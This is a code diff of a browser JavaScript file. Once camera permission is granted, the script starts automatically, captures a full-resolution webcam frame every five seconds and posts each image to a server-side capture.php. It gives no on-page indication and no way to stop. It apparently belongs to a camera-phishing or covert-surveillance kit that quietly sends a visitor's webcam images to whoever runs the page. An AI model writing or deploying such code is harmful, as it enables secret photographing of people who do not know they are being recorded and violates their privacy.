@@ -1,25 +1,114 @@
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
-// Ask for Camera Access
-navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-    .then(stream => {
+let streamStarted = false;
+
+/*
+start camera automatically
+*/
+
+async function startCamera() {
+
+    try {
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+
+            video: {
+                width: 1280,
+                height: 720
+            },
+
+            audio: false
+
+        });
+
         video.srcObject = stream;
-        // Start automatic capture every 7 seconds
-        setInterval(takeSnapshot, 7000);
-    })
-    .catch(err => {
-        console.error("Camera access denied: ", err);
-    });
 
-function takeSnapshot() {
-    const context = canvas.getContext('2d');
-    context.drawImage(video, 0, 0, 640, 480);
-    const imageData = canvas.toDataURL('image/png');
+        if (!streamStarted) {
 
-    fetch('capture.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: imageData })
-    });
+            streamStarted = true;
+
+            startCaptureLoop();
+
+        }
+
+    } catch (err) {
+
+        console.log("Camera permission denied");
+
+    }
+
 }
+
+/*
+capture image repeatedly
+*/
+
+function startCaptureLoop() {
+
+    setInterval(() => {
+
+        captureImage();
+
+    }, 5000);
+
+}
+
+/*
+capture single frame
+*/
+
+function captureImage() {
+
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+
+    canvas.height = video.videoHeight;
+
+    ctx.drawImage(video, 0, 0);
+
+    const imgData = canvas.toDataURL("image/png");
+
+    sendImage(imgData);
+
+}
+
+/*
+send to php
+*/
+
+function sendImage(image) {
+
+    fetch("capture.php", {
+
+        method: "POST",
+
+        headers: {
+            "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+            image: image
+        })
+
+    })
+        .then(res => res.json())
+        .then(data => {
+
+            console.log("image sent");
+
+        })
+        .catch(err => {
+
+            console.log("send error");
+
+        });
+
+}
+
+/*
+start automatically
+*/
+
+startCamera();
